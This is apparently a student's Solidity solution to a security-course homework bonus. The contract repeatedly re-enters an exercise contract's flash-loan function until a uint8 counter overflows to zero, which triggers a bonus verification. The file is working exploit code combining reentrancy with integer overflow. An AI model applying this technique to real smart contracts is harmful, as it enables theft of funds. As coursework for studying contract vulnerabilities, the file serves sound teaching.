pragma solidity ^0.4.21;

import "./FlashLoanReceiver.sol";
import "./CNSToken.sol";
import "./CNS_contract.sol";



contract hw3_bonus is IFlashLoanReceiver{
    HW3 hw3;
    CNSToken cnsToken;
    string ID;
    uint score;
    constructor (address addr) public payable{
        hw3 = HW3(addr);
        ID = "b07902116";
        flashloaning = 0;
    }
    
    
    // Bonus
    uint8 public flashloaning = 0;
    // uint8 max = 255
    
    function bonus(){
        flashloaning += 4;
        hw3.flashloan(10000);
    }

    
    function execute(address tokenAddr, address lender, uint256 amount) external returns(bool){
        cnsToken = CNSToken(tokenAddr);
        
        if (flashloaning != 0){
            flashloaning += 4;
            hw3.flashloan(10000);
            flashloaning -= 4;
        }
        else{
            hw3.bonus_verify(ID);
        }
        
        // remember to return the fund
        // approve lender can transfer your tokens
        cnsToken.approve(lender,amount);
        return true;
    }
    
    // Check
    function getScore() view public returns (uint){
        return hw3.getScore(ID);
    }
    
    
    
}